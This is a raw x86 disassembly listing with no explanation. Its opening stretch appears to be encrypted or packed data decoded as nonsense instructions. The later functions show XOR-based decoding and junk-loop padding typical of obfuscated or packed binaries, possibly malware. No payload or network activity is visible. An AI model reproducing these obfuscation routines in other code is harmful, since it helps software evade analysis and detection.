  40f49b:	add    eax,0xf93ad79e
  40f4a0:	dec    eax
  40f4a1:	fldenv [esi]
  40f4a3:	cmp    edi,DWORD PTR [edi]
  40f4a5:	scas   eax,DWORD PTR es:[edi]
  40f4a6:	or     DWORD PTR [ecx-0x14db1ac8],eax
  40f4ac:	inc    edx
  40f4ad:	jns    0x89520abe
  40f4b3:	jmp    FWORD PTR [eax]
  40f4b5:	xor    al,0xa7
  40f4b7:	ss (bad) 
  40f4b9:	call   0x8f99e426
  40f4be:	pusha  
  40f4bf:	out    0xa8,al
  40f4c1:	jbe    0x40f521
  40f4c3:	ss pop edi
  40f4c5:	inc    eax
  40f4c6:	or     eax,0x8fb1785f
  40f4cb:	xor    DWORD PTR [ebp-0x62],0x845de7
  40f4d2:	sbb    al,0xc6
  40f4d4:	dec    esp
  40f4d5:	jne    0x40f51f
  40f4d7:	bound  ebx,QWORD PTR [esi-0x4a]
  40f4da:	push   cs
  40f4db:	sahf   
  40f4dc:	push   esi
  40f4dd:	sub    dh,ch
  40f4df:	push   es
  40f4e0:	pop    ecx
  40f4e1:	sbb    eax,0x22db70d7
  40f4e6:	xor    eax,0x48656b3
  40f4eb:	push   edi
  40f4ec:	mov    al,0x5
  40f4ee:	ins    DWORD PTR es:[edi],dx
  40f4ef:	clc    
  40f4f0:	test   al,0x9f
  40f4f2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f4f3:	sbb    edi,DWORD PTR [ebx-0x54]
  40f4f6:	push   eax
  40f4f7:	jp     0x40f4ce
  40f4f9:	pop    ebx
  40f4fa:	jl     0x40f554
  40f4fc:	xor    eax,ecx
  40f4fe:	cmp    ebx,DWORD PTR [edx+0x2a9b34c]
  40f504:	test   ebp,ecx
  40f506:	jg     0x40f4a2
  40f508:	cs out dx,eax
  40f50a:	or     BYTE PTR [eax+0x3b],al
  40f50d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f50e:	adc    eax,0xce997447
  40f513:	popa   
  40f514:	cli    
  40f515:	adc    eax,DWORD PTR [eax-0x28]
  40f518:	loopne 0x40f57e
  40f51a:	inc    ebp
  40f51b:	outs   dx,DWORD PTR ds:[esi]
  40f51c:	pop    ebx
  40f51d:	ret    0x5a88
  40f520:	sbb    BYTE PTR [edi-0x54],0xfa
  40f524:	xchg   edi,eax
  40f525:	pop    edx
  40f526:	adc    eax,0x1b3a2330
  40f52b:	pop    eax
  40f52c:	aam    0x91
  40f52e:	inc    ebx
  40f52f:	sub    edx,DWORD PTR [edi+0x7c]
  40f532:	stos   DWORD PTR es:[edi],eax
  40f533:	mov    cl,0x26
  40f535:	push   esp
  40f536:	mov    al,0x31
  40f538:	pop    es
  40f539:	in     al,dx
  40f53a:	sub    dl,BYTE PTR [esi+0xb]
  40f53d:	std    
  40f53e:	bound  eax,QWORD PTR [ecx]
  40f540:	add    al,0x48
  40f542:	leave  
  40f543:	mov    dh,0x58
  40f545:	iret   
  40f546:	(bad)  
  40f547:	mov    ah,0xaf
  40f549:	in     al,0x98
  40f54b:	jnp    0x40f4d9
  40f54d:	jp     0x40f539
  40f54f:	stc    
  40f550:	push   ebx
  40f551:	call   0x48af:0xc35051a4
  40f558:	sbb    eax,0xa50a79e3
  40f55d:	xor    BYTE PTR [edx-0xc],al
  40f560:	inc    edi
  40f561:	cmp    edi,edx
  40f563:	mov    esp,0xe425eddb
  40f568:	repz sub BYTE PTR [ebx+0x7a897542],dh
  40f56f:	das    
  40f570:	cmp    DWORD PTR [ecx+0x5d],esp
  40f573:	sbb    eax,0x63255ccf
  40f578:	fild   DWORD PTR [ebp-0x59]
  40f57b:	mov    esi,0xbada6e90
  40f580:	mov    ds:0x382351f,al
  40f585:	xlat   BYTE PTR ds:[ebx]
  40f586:	arpl   dx,ax
  40f588:	hlt    
  40f589:	fst    DWORD PTR [ebx-0x6a]
  40f58c:	lods   eax,DWORD PTR ds:[esi]
  40f58d:	add    DWORD PTR [esp+esi*1],0x1ab97b82
  40f594:	xor    DWORD PTR [esi],0x74
  40f597:	jo     0x40f58e
  40f599:	push   ss
  40f59a:	in     al,dx
  40f59b:	pushf  
  40f59c:	cld    
  40f59d:	repz lock pop ds
  40f5a0:	xchg   edi,eax
  40f5a1:	pop    ebx
  40f5a2:	or     BYTE PTR [ebx+0x7c77c4d1],cl
  40f5a8:	cmp    al,0x9f
  40f5aa:	pop    edi
  40f5ab:	adc    bl,cl
  40f5ad:	add    eax,0xa8c31cb4
  40f5b2:	or     DWORD PTR fs:[eax+0x32fe1dab],ebx
  40f5b9:	in     eax,dx
  40f5ba:	push   ebx
  40f5bb:	ror    esp,1
  40f5bd:	clc    
  40f5be:	mov    ebp,0x7c1b4231
  40f5c3:	clc    
  40f5c4:	rol    BYTE PTR [ebp+0x7e],0x8
  40f5c8:	add    BYTE PTR [ecx],ch
  40f5ca:	and    dh,BYTE PTR [edi]
  40f5cc:	outs   dx,DWORD PTR ds:[esi]
  40f5cd:	xchg   ebp,eax
  40f5ce:	imul   eax,DWORD PTR [ebx],0x5338b84
  40f5d4:	or     ebp,esp
  40f5d6:	shl    BYTE PTR [esi],1
  40f5d8:	stos   DWORD PTR es:[edi],eax
  40f5d9:	call   0x14c4850f
  40f5de:	les    esp,FWORD PTR [ebx+0x2fd2b31b]
  40f5e4:	loop   0x40f5fe
  40f5e6:	jp     0x40f65d
  40f5e8:	adc    al,0x9
  40f5ea:	or     eax,0xd531250b
  40f5ef:	(bad)  
  40f5f1:	xor    BYTE PTR [ebx+eiz*8],ah
  40f5f4:	xor    al,0xa6
  40f5f6:	mov    edi,esp
  40f5f8:	cmp    eax,0xa1803f9c
  40f5fd:	push   0x63ec3c58
  40f602:	mov    ecx,0x87debe75
  40f607:	xchg   ebx,eax
  40f608:	test   eax,0xf760d629
  40f60d:	test   cl,ah
  40f60f:	fisub  WORD PTR [eax+0x30]
  40f612:	in     eax,dx
  40f613:	mov    edi,0x89956274
  40f618:	sti    
  40f619:	idiv   DWORD PTR [esi]
  40f61b:	enter  0x1c53,0x98
  40f61f:	mov    cl,0x90
  40f621:	call   0xdcc88c4f
  40f626:	or     al,0x5e
  40f628:	lods   eax,DWORD PTR ds:[esi]
  40f629:	and    DWORD PTR [eax],0xffffffc7
  40f62c:	icebp  
  40f62d:	or     BYTE PTR [esi-0x15069004],dl
  40f633:	ret    0x800c
  40f636:	fld    TBYTE PTR [esi-0x6ca4fc7f]
  40f63c:	fimul  WORD PTR [edi-0x79]
  40f63f:	cmc    
  40f640:	xor    BYTE PTR [edi-0x46c67a75],bh
  40f646:	jmp    0x8486d504
  40f64b:	xchg   BYTE PTR [ecx-0x17],dh
  40f64e:	stc    
  40f64f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f650:	fsubrp st(5),st
  40f652:	adc    BYTE PTR [edi-0x38767bd8],ah
  40f658:	inc    eax
  40f659:	add    eax,0x788c1a85
  40f65e:	dec    edi
  40f65f:	popf   
  40f660:	pop    esp
  40f661:	add    eax,0xa21e7b4a
  40f666:	push   ecx
  40f667:	mov    ch,0xcc
  40f669:	fld    QWORD PTR [ebx]
  40f66b:	repz ja 0x40f623
  40f66e:	mov    ah,bh
  40f670:	test   eax,0x5d5b93f8
  40f675:	xchg   ebp,eax
  40f676:	jbe    0x40f652
  40f678:	sbb    bh,BYTE PTR [ebp-0x80]
  40f67b:	retf   0xdcb
  40f67e:	push   edi
  40f67f:	xchg   esp,eax
  40f680:	sbb    esp,esi
  40f682:	push   ds
  40f683:	mov    esp,0x171daffb
  40f688:	cs sbb al,0x17
  40f68b:	dec    ecx
  40f68c:	loopne 0x40f68b
  40f68e:	mov    al,0x4f
  40f690:	cmp    eax,0x9afae036
  40f695:	loop   0x40f67d
  40f697:	pushf  
  40f698:	inc    edi
  40f699:	adc    dh,BYTE PTR [ecx]
  40f69b:	mov    ah,0xb1
  40f69d:	(bad)  
  40f69e:	out    0xfa,eax
  40f6a0:	shl    BYTE PTR [ebp-0x52],1
  40f6a3:	lea    ebx,[eax+0x14aef38e]
  40f6a9:	in     eax,dx
  40f6aa:	dec    edi
  40f6ab:	aam    0x46
  40f6ad:	inc    esp
  40f6ae:	cld    
  40f6af:	jb     0x40f688
  40f6b1:	scas   eax,DWORD PTR es:[edi]
  40f6b2:	sbb    cl,BYTE PTR [eax+ecx*4]
  40f6b5:	mov    ?,WORD PTR ds:0xdb4d1d2c
  40f6bb:	dec    ebp
  40f6bc:	cmp    esp,DWORD PTR ds:0xcf3c69f
  40f6c2:	aam    0x31
  40f6c4:	(bad)  
  40f6c5:	div    BYTE PTR [ebp-0x4e]
  40f6c8:	sbb    ch,BYTE PTR [edi]
  40f6ca:	or     al,0xd4
  40f6cc:	loope  0x40f66a
  40f6ce:	sub    dh,BYTE PTR [eax]
  40f6d0:	leave  
  40f6d1:	or     DWORD PTR [esi+0x38889249],0x8fb0f910
  40f6db:	dec    edi
  40f6dc:	enter  0xf57,0xef
  40f6e0:	and    eax,0x4bc407b
  40f6e5:	out    dx,eax
  40f6e6:	jmp    0x1341:0xfc3a74ba
  40f6ed:	sbb    eax,0x74917d68
  40f6f2:	lock pop ecx
  40f6f4:	mov    edx,0x2638434f
  40f6f9:	pop    edi
  40f6fa:	jp     0x40f720
  40f6fc:	add    eax,esp
  40f6fe:	dec    ecx
  40f6ff:	mov    eax,ds:0xd68ccc54
  40f704:	pop    es
  40f705:	push   eax
  40f706:	fiadd  WORD PTR [eax-0x3b]
  40f709:	pop    edx
  40f70a:	test   BYTE PTR [ebx-0x5eecde63],ch
  40f710:	test   DWORD PTR [eax],0x1c6d2046
  40f716:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f717:	jge    0x40f77b
  40f719:	jg     0x40f6a4
  40f71b:	daa    
  40f71c:	push   ecx
  40f71d:	shr    DWORD PTR [eax+0x2f],0x8d
  40f721:	mov    cl,0xad
  40f723:	dec    eax
  40f724:	or     esp,DWORD PTR [eax+0x69]
  40f727:	lock fisttp WORD PTR [eax+0x58001fbb]
  40f72e:	call   0xc9ff:0xc92de339
  40f735:	fst    QWORD PTR [eax-0x266927ec]
  40f73b:	pop    ebx
  40f73c:	lods   al,BYTE PTR ds:[esi]
  40f73d:	stos   DWORD PTR es:[edi],eax
  40f73e:	xchg   ecx,eax
  40f73f:	dec    ebp
  40f740:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  40f742:	pop    ds
  40f743:	push   0x12516344
  40f748:	icebp  
  40f749:	pusha  
  40f74a:	or     ebx,DWORD PTR [ecx+ebp*8+0x60a40e8e]
  40f751:	add    esp,eax
  40f753:	xchg   edx,eax
  40f754:	push   eax
  40f755:	xor    ebx,ebx
  40f757:	mov    edx,esp
  40f759:	dec    edx
  40f75a:	inc    ebx
  40f75b:	add    ebx,DWORD PTR [edx+ebx*1]
  40f75e:	dec    ebx
  40f75f:	xor    edx,edx
  40f761:	add    DWORD PTR [ebp-0x10],ebx
  40f764:	pop    ebx
  40f765:	mov    eax,DWORD PTR [ebp-0x10]
  40f768:	pop    edi
  40f769:	pop    esi
  40f76a:	pop    ebx
  40f76b:	leave  
  40f76c:	ret    0x10
  40f76f:	push   ebp
  40f770:	mov    ebp,esp
  40f772:	push   ecx
  40f773:	mov    DWORD PTR [ebp-0x4],0xf89c85a1
  40f77a:	mov    ecx,DWORD PTR ds:0x42b26e
  40f780:	mov    edx,DWORD PTR ds:0x42b2da
  40f786:	sub    edx,ecx
  40f788:	xor    ecx,DWORD PTR [ecx+edx*1]
  40f78b:	mov    eax,DWORD PTR [ebp-0x4]
  40f78e:	and    DWORD PTR ds:0x42b226,0x0
  40f798:	mov    edx,DWORD PTR ds:0x42b226
  40f79e:	inc    edx
  40f79f:	mov    DWORD PTR ds:0x42b226,edx
  40f7a5:	cmp    DWORD PTR ds:0x42b226,0xb
  40f7ac:	jb     0x40f7f2
  40f7b2:	jmp    0x40f7cb
  40f7b7:	push   DWORD PTR [ebp-0x24]
  40f7ba:	push   DWORD PTR [ebp-0x24]
  40f7bd:	push   0x42a23f
  40f7c2:	push   DWORD PTR [ebp-0x1c]
  40f7c5:	call   DWORD PTR ds:0x42b306
  40f7cb:	cmp    DWORD PTR ds:0x42b226,0xa
  40f7d2:	jne    0x40f7e5
  40f7d8:	mov    edx,DWORD PTR ds:0x42b226
  40f7de:	inc    edx
  40f7df:	mov    DWORD PTR ds:0x42b226,edx
  40f7e5:	cmp    DWORD PTR ds:0x42b226,0x17
  40f7ec:	jb     0x40f798
  40f7f2:	mov    edx,DWORD PTR [ebp+0x10]
  40f7f5:	mov    ecx,0x75108ae
  40f7fa:	add    DWORD PTR ds:0x42b1ea,0x1734
  40f804:	xor    eax,ecx
  40f806:	add    eax,0x3272f5
  40f80b:	mov    DWORD PTR [edx],eax
  40f80d:	mov    eax,DWORD PTR [ebp+0xc]
  40f810:	xor    eax,ecx
  40f812:	push   esi
  40f813:	mov    esi,DWORD PTR [ebp+0x10]
  40f816:	mov    edx,0x3272f5
  40f81b:	add    eax,edx
  40f81d:	mov    DWORD PTR [esi+0x4],eax
  40f820:	mov    eax,DWORD PTR [ebp+0x14]
  40f823:	mov    esi,DWORD PTR [ebp+0x10]
  40f826:	mov    DWORD PTR [esi+0x8],eax
  40f829:	mov    eax,DWORD PTR [ebp+0x18]
  40f82c:	mov    esi,DWORD PTR [ebp+0x10]
  40f82f:	mov    DWORD PTR [esi+0xc],eax
  40f832:	mov    eax,DWORD PTR [ebp+0x1c]
  40f835:	mov    esi,DWORD PTR [ebp+0x10]
  40f838:	mov    DWORD PTR [esi+0x10],eax
  40f83b:	mov    eax,DWORD PTR [ebp+0x8]
  40f83e:	xor    eax,ecx
  40f840:	add    eax,edx
  40f842:	pop    esi
  40f843:	leave  
  40f844:	ret    0x18
  40f847:	push   ebp
  40f848:	mov    ebp,esp
  40f84a:	sub    esp,0x9c
  40f850:	and    DWORD PTR ds:0x42b1b6,0x0
  40f85a:	mov    ecx,DWORD PTR ds:0x42b1b6
  40f860:	inc    ecx
  40f861:	mov    DWORD PTR ds:0x42b1b6,ecx
  40f867:	cmp    DWORD PTR ds:0x42b1b6,0xd
  40f86e:	ja     0x40f8b2
  40f874:	jmp    0x40f88b
  40f879:	push   0x42a1d7
  40f87e:	push   0x0
  40f880:	push   0x7b23
  40f885:	call   DWORD PTR ds:0x42b30e
  40f88b:	cmp    DWORD PTR ds:0x42b1b6,0xc
  40f892:	jne    0x40f8a5
  40f898:	mov    ecx,DWORD PTR ds:0x42b1b6
  40f89e:	inc    ecx
  40f89f:	mov    DWORD PTR ds:0x42b1b6,ecx
  40f8a5:	cmp    DWORD PTR ds:0x42b1b6,0x14
  40f8ac:	jb     0x40f85a
  40f8b2:	mov    ecx,DWORD PTR [ebp+0x8]
  40f8b5:	xor    eax,DWORD PTR ds:0x42b1a6
  40f8bb:	mov    eax,0x8a9a
  40f8c0:	xor    ax,WORD PTR [ecx+0x20]
  40f8c4:	xor    DWORD PTR ds:0x42b1d6,ebx
  40f8ca:	mov    ecx,0x3b5c
  40f8cf:	adc    DWORD PTR ds:0x42b206,0x42b22e
  40f8d9:	add    ax,cx
  40f8dc:	and    DWORD PTR ds:0x42b1ba,0x0
  40f8e6:	mov    ecx,DWORD PTR ds:0x42b1ba
  40f8ec:	inc    ecx
  40f8ed:	mov    DWORD PTR ds:0x42b1ba,ecx
  40f8f3:	cmp    DWORD PTR ds:0x42b1ba,0x1e
  40f8fa:	jge    0x40f91b
  40f900:	jmp    0x40f90e
  40f905:	push   DWORD PTR [ebp-0x20]
  40f908:	call   DWORD PTR ds:0x42b316
  40f90e:	cmp    DWORD PTR ds:0x42b1ba,0x19
  40f915:	jb     0x40f8e6
  40f91b:	movzx  eax,ax
  40f91e:	or     ecx,DWORD PTR ds:0x42b1fa
  40f924:	mov    DWORD PTR [ebp-0x10],eax
  40f927:	and    DWORD PTR ds:0x42b1a2,0x5305
  40f931:	mov    BYTE PTR [ebp-0x1],0x80
  40f935:	mov    ecx,DWORD PTR ds:0x42b22a
  40f93b:	sub    DWORD PTR ds:0x42b1f6,ecx
  40f941:	lea    eax,[ebp-0x1]
  40f944:	mov    DWORD PTR ds:0x42b21e,0x14
  40f94e:	cmp    DWORD PTR ds:0x42b21e,0x0
  40f955:	je     0x40f9a6
  40f95b:	cmp    DWORD PTR ds:0x42b21e,0x4
  40f962:	ja     0x40f9a6
  40f968:	jmp    0x40f97a
  40f96d:	push   0x5
  40f96f:	push   0x6029
  40f974:	call   DWORD PTR ds:0x42b31a
  40f97a:	cmp    DWORD PTR ds:0x42b21e,0x5
  40f981:	jne    0x40f994
  40f987:	mov    ecx,DWORD PTR ds:0x42b21e
  40f98d:	dec    ecx
  40f98e:	mov    DWORD PTR ds:0x42b21e,ecx
  40f994:	mov    ecx,DWORD PTR ds:0x42b21e
  40f99a:	dec    ecx
  40f99b:	mov    DWORD PTR ds:0x42b21e,ecx
  40f9a1:	jmp    0x40f94e
  40f9a6:	mov    DWORD PTR [ebp-0xc],eax
  40f9a9:	or     ecx,DWORD PTR ds:0x42b212
  40f9af:	mov    al,BYTE PTR [ebp-0x1]
  40f9b2:	xor    DWORD PTR ds:0x42b226,0x485
  40f9bc:	mov    ecx,DWORD PTR [ebp-0xc]
  40f9bf:	xor    al,0x7e
  40f9c1:	add    al,0x3
  40f9c3:	and    DWORD PTR ds:0x42b20a,0x20b6
  40f9cd:	mov    BYTE PTR [ecx],al
  40f9cf:	sbb    ecx,0x5f8e
  40f9d5:	mov    DWORD PTR [ebp-0x18],0xf89c85a5
  40f9dc:	push   ebx
  40f9dd:	mov    DWORD PTR [ebp-0x8],0xf89c85a2
  40f9e4:	and    DWORD PTR ds:0x42b1da,0x0
  40f9ee:	jmp    0x40f9fe
  40f9f3:	mov    eax,ds:0x42b1da
  40f9f8:	inc    eax
  40f9f9:	mov    ds:0x42b1da,eax
  40f9fe:	cmp    DWORD PTR ds:0x42b1da,0x14
  40fa05:	jae    0x40fa55
  40fa0b:	cmp    DWORD PTR ds:0x42b1da,0xb
  40fa12:	jbe    0x40fa55
  40fa18:	jmp    0x40fa35
  40fa1d:	push   0x42b1f2
  40fa22:	push   DWORD PTR [ebp-0xc]
  40fa25:	push   0x42a000
  40fa2a:	push   0x42a18d
  40fa2f:	call   DWORD PTR ds:0x42b31e
  40fa35:	cmp    DWORD PTR ds:0x42b1da,0xa
  40fa3c:	jne    0x40fa50
  40fa42:	xor    eax,eax
  40fa44:	xor    eax,DWORD PTR ds:0x42b1da
  40fa4a:	inc    eax
  40fa4b:	mov    ds:0x42b1da,eax
  40fa50:	jmp    0x40f9f3
  40fa55:	mov    ecx,DWORD PTR [ebp-0x18]
  40fa58:	sub    DWORD PTR ds:0x42b1fa,0x685a
  40fa62:	push   esi
  40fa63:	dec    esi
  40fa64:	mov    eax,0x75108ae
  40fa69:	and    DWORD PTR ds:0x42b1b2,0x4a0b
  40fa73:	xor    ecx,eax
  40fa75:	or     DWORD PTR ds:0x42b212,ebx
  40fa7b:	mov    esi,0x3272f5
  40fa80:	adc    DWORD PTR ds:0x42b216,0x42b222
  40fa8a:	push   edi
  40fa8b:	and    DWORD PTR ds:0x42b19a,0x42b1a2
  40fa95:	add    ecx,esi
  40fa97:	mov    DWORD PTR ds:0x42b212,0x27f7
  40faa1:	jmp    0x40facf
  40faa6:	mov    DWORD PTR ds:0x42b1a2,0x4c70
  40fab0:	mov    dl,BYTE PTR [ebp-0x1]
  40fab3:	mov    DWORD PTR ds:0x42b1da,0x7ef5
  40fabd:	mov    BYTE PTR [ebp+ecx*1-0x9c],dl
  40fac4:	mov    DWORD PTR ds:0x42b21a,0x736d
  40face:	inc    ecx
  40facf:	mov    DWORD PTR ds:0x42b1b2,0x61ef
  40fad9:	cmp    ecx,0x40
  40fadc:	jb     0x40faa6
  40fae2:	sbb    edx,DWORD PTR ds:0x42b1de
  40fae8:	mov    edx,DWORD PTR [ebp-0x18]
  40faeb:	adc    DWORD PTR ds:0x42b18e,0x3f3e
  40faf5:	xor    edx,eax
  40faf7:	sub    DWORD PTR ds:0x42b1d2,0x42b1ce
  40fb01:	add    edx,esi
  40fb03:	jmp    0x40fbc0
  40fb08:	mov    edi,DWORD PTR [ebp+0x8]
  40fb0b:	mov    ecx,0x8a9a
  40fb10:	sbb    DWORD PTR ds:0x42b1e6,0x42b226
  40fb1a:	xor    cx,WORD PTR [edi+edx*4+0x2]
  40fb1f:	adc    DWORD PTR ds:0x42b1de,ecx
  40fb25:	mov    edi,0x3b5c
  40fb2a:	xor    DWORD PTR ds:0x42b1ca,0x42b1a2
  40fb34:	add    cx,di
  40fb37:	adc    DWORD PTR ds:0x42b1b6,0x7f83
  40fb41:	movzx  ecx,cx
  40fb44:	and    DWORD PTR ds:0x42b1f6,0x42b18a
  40fb4e:	mov    DWORD PTR [ebp-0xc],ecx
  40fb51:	and    DWORD PTR ds:0x42b21a,0x0
  40fb5b:	jmp    0x40fb6d
  40fb60:	mov    ecx,DWORD PTR ds:0x42b21a
  40fb66:	inc    ecx
  40fb67:	mov    DWORD PTR ds:0x42b21a,ecx
  40fb6d:	cmp    DWORD PTR ds:0x42b21a,0x19
  40fb74:	jae    0x40fb9c
  40fb7a:	cmp    DWORD PTR ds:0x42b21a,0x1e
  40fb81:	jge    0x40fb9c
  40fb87:	jmp    0x40fb97
  40fb8c:	push   0x1c76
  40fb91:	call   DWORD PTR ds:0x42b322
  40fb97:	jmp    0x40fb60
  40fb9c:	mov    ecx,DWORD PTR [ebp+0x8]
  40fb9f:	add    DWORD PTR ds:0x42b1d2,0x42b1ea
  40fba9:	movzx  ecx,WORD PTR [ecx+edx*4]
  40fbad:	xor    ecx,0x8a9a
  40fbb3:	add    ecx,edi
  40fbb5:	mov    edi,DWORD PTR [ebp-0xc]
  40fbb8:	mov    BYTE PTR [ebp+edi*1-0x9c],cl
  40fbbf:	inc    edx
  40fbc0:	mov    ecx,0xfa9
  40fbc5:	mov    ecx,DWORD PTR [ebp-0x10]
  40fbc8:	cmp    edx,ecx
  40fbca:	jne    0x40fb08
  40fbd0:	mov    DWORD PTR ds:0x42b186,0x1e
  40fbda:	cmp    DWORD PTR ds:0x42b186,0x0
  40fbe1:	je     0x40fc18
  40fbe7:	cmp    DWORD PTR ds:0x42b186,0x24
  40fbee:	jle    0x40fc18
  40fbf4:	jmp    0x40fc04
  40fbf9:	push   0x7864
  40fbfe:	call   DWORD PTR ds:0x42b326
  40fc04:	xor    ecx,ecx
  40fc06:	add    ecx,DWORD PTR ds:0x42b186
  40fc0c:	dec    ecx
  40fc0d:	mov    DWORD PTR ds:0x42b186,ecx
  40fc13:	jmp    0x40fbda
  40fc18:	mov    ecx,DWORD PTR [ebp-0x18]
  40fc1b:	and    edi,edx
  40fc1d:	mov    edx,DWORD PTR [ebp+0x10]
  40fc20:	and    DWORD PTR ds:0x42b19a,0x0
  40fc2a:	mov    edi,DWORD PTR ds:0x42b19a
  40fc30:	inc    edi
  40fc31:	mov    DWORD PTR ds:0x42b19a,edi
  40fc37:	cmp    DWORD PTR ds:0x42b19a,0x25
  40fc3e:	jge    0x40fc76
  40fc44:	jmp    0x40fc69
  40fc49:	push   0x42a0fe
  40fc4e:	push   0x5d6f
  40fc53:	push   0x13cc
  40fc58:	push   DWORD PTR [ebp-0x1c]
  40fc5b:	push   0x3c54
  40fc60:	push   DWORD PTR [ebp-0x20]
  40fc63:	call   DWORD PTR ds:0x42b2ea
  40fc69:	cmp    DWORD PTR ds:0x42b19a,0x1d
  40fc70:	jb     0x40fc2a
  40fc76:	xor    ecx,eax
  40fc78:	inc    edi
  40fc79:	add    ecx,esi
  40fc7b:	and    DWORD PTR ds:0x42b1b6,0x0
  40fc85:	jmp    0x40fc97
  40fc8a:	mov    edi,DWORD PTR ds:0x42b1b6
  40fc90:	inc    edi
  40fc91:	mov    DWORD PTR ds:0x42b1b6,edi
  40fc97:	cmp    DWORD PTR ds:0x42b1b6,0x10
  40fc9e:	jae    0x40fcea
  40fca4:	cmp    DWORD PTR ds:0x42b1b6,0x6
  40fcab:	jl     0x40fcea
  40fcb1:	jmp    0x40fcc9
  40fcb6:	push   0x42a0fe
  40fcbb:	push   DWORD PTR [ebp-0x14]
  40fcbe:	push   0x1
  40fcc0:	push   DWORD PTR [ebp-0x1c]
  40fcc3:	call   DWORD PTR ds:0x42b2ee
  40fcc9:	cmp    DWORD PTR ds:0x42b1b6,0x5
  40fcd0:	jne    0x40fce5
  40fcd6:	xor    edi,edi
  40fcd8:	xor    edi,DWORD PTR ds:0x42b1b6
  40fcde:	inc    edi
  40fcdf:	mov    DWORD PTR ds:0x42b1b6,edi
  40fce5:	jmp    0x40fc8a
  40fcea:	mov    DWORD PTR [edx],ecx
  40fcec:	xor    ecx,ecx
  40fcee:	mov    ecx,DWORD PTR [ebp-0x18]
  40fcf1:	and    DWORD PTR ds:0x42b1e2,0x0
  40fcfb:	xor    edi,edi
  40fcfd:	xor    edi,DWORD PTR ds:0x42b1e2
  40fd03:	inc    edi
  40fd04:	mov    DWORD PTR ds:0x42b1e2,edi
  40fd0a:	cmp    DWORD PTR ds:0x42b1e2,0x29
  40fd11:	ja     0x40fd32
  40fd17:	jmp    0x40fd25
  40fd1c:	push   DWORD PTR [ebp-0x14]
  40fd1f:	call   DWORD PTR ds:0x42b2f2
  40fd25:	cmp    DWORD PTR ds:0x42b1e2,0x19
  40fd2c:	jb     0x40fcfb
  40fd32:	xor    ecx,eax
  40fd34:	and    edi,0x72ff
  40fd3a:	add    ecx,esi
  40fd3c:	or     DWORD PTR ds:0x42b182,0x54fc
  40fd46:	mov    DWORD PTR [ebp-0xc],ecx
  40fd49:	adc    edi,DWORD PTR ds:0x42b1e6
  40fd4f:	mov    DWORD PTR [ebp+0x8],0xf89c85a5
  40fd56:	or     edi,DWORD PTR ds:0x42b226
  40fd5c:	mov    DWORD PTR [ebp-0x14],0xf89c85b5
  40fd63:	and    DWORD PTR ds:0x42b1ba,0x0
  40fd6d:	jmp    0x40fd7f
  40fd72:	mov    ecx,DWORD PTR ds:0x42b1ba
  40fd78:	inc    ecx
  40fd79:	mov    DWORD PTR ds:0x42b1ba,ecx
  40fd7f:	cmp    DWORD PTR ds:0x42b1ba,0x12
  40fd86:	jae    0x40fdca
  40fd8c:	cmp    DWORD PTR ds:0x42b1ba,0x4
  40fd93:	jle    0x40fdca
  40fd99:	jmp    0x40fda9
  40fd9e:	push   0x42b226
  40fda3:	call   DWORD PTR ds:0x42b2f6
  40fda9:	cmp    DWORD PTR ds:0x42b1ba,0x3
  40fdb0:	jne    0x40fdc5
  40fdb6:	xor    ecx,ecx
  40fdb8:	xor    ecx,DWORD PTR ds:0x42b1ba
  40fdbe:	inc    ecx
  40fdbf:	mov    DWORD PTR ds:0x42b1ba,ecx
  40fdc5:	jmp    0x40fd72
  40fdca:	mov    DWORD PTR [ebp-0x10],0xf89c95a5
  40fdd1:	mov    ecx,DWORD PTR [ebp-0x14]
  40fdd4:	mov    DWORD PTR [ebp+0x8],ecx
  40fdd7:	mov    ecx,DWORD PTR [ebp+0x8]
  40fdda:	xor    DWORD PTR ds:0x42b20a,edi
  40fde0:	xor    ecx,eax
  40fde2:	or     edi,DWORD PTR ds:0x42b182
  40fde8:	add    ecx,esi
  40fdea:	mov    ecx,0x242ebf1
  40fdef:	mov    edi,0xf641bf0
  40fdf4:	je     0x419191
  40fdfa:	add    DWORD PTR ds:0x42b1c2,0x6a2f
  40fe04:	mov    edx,DWORD PTR [ebp+0x8]
  40fe07:	mov    ebx,DWORD PTR ds:0x42b1aa
  40fe0d:	and    ebx,DWORD PTR ds:0x42b1f2
  40fe13:	mov    DWORD PTR ds:0x42b1aa,ebx
  40fe19:	mov    ebx,DWORD PTR [ebp-0x8]
  40fe1c:	xor    edx,eax
  40fe1e:	xor    ebx,eax
  40fe20:	xor    DWORD PTR ds:0x42b1e6,0x42b196
  40fe2a:	sub    edx,ebx
  40fe2c:	sub    edx,esi
  40fe2e:	mov    DWORD PTR ds:0x42b1ce,0x13
  40fe38:	cmp    DWORD PTR ds:0x42b1ce,0x0
  40fe3f:	je     0x40fe81
  40fe45:	cmp    DWORD PTR ds:0x42b1ce,0x1c
  40fe4c:	jb     0x40fe81
  40fe52:	jmp    0x40fe6f
  40fe57:	push   0x42b1ca
  40fe5c:	push   0x42b196
  40fe61:	push   DWORD PTR [ebp-0x1c]
  40fe64:	push   0x42a12c
  40fe69:	call   DWORD PTR ds:0x42b2fa
  40fe6f:	mov    ebx,DWORD PTR ds:0x42b1ce
  40fe75:	dec    ebx
  40fe76:	mov    DWORD PTR ds:0x42b1ce,ebx
  40fe7c:	jmp    0x40fe38
  40fe81:	xor    edx,eax
  40fe83:	and    DWORD PTR ds:0x42b196,0x0
  40fe8d:	jmp    0x40fe9f
  40fe92:	mov    ebx,DWORD PTR ds:0x42b196
  40fe98:	inc    ebx
  40fe99:	mov    DWORD PTR ds:0x42b196,ebx
  40fe9f:	cmp    DWORD PTR ds:0x42b196,0x1b
  40fea6:	jae    0x40feef
  40feac:	cmp    DWORD PTR ds:0x42b196,0x6
  40feb3:	jb     0x40feef
  40feb9:	jmp    0x40fece
  40febe:	push   0x42b226
  40fec3:	push   0x42a000
  40fec8:	call   DWORD PTR ds:0x42b2fe
  40fece:	cmp    DWORD PTR ds:0x42b196,0x5
  40fed5:	jne    0x40feea
  40fedb:	xor    ebx,ebx
  40fedd:	add    ebx,DWORD PTR ds:0x42b196
  40fee3:	inc    ebx
  40fee4:	mov    DWORD PTR ds:0x42b196,ebx
  40feea:	jmp    0x40fe92
  40feef:	mov    DWORD PTR [ebp+0x8],edx
  40fef2:	and    DWORD PTR ds:0x42b196,0x0
  40fefc:	jmp    0x40ff10
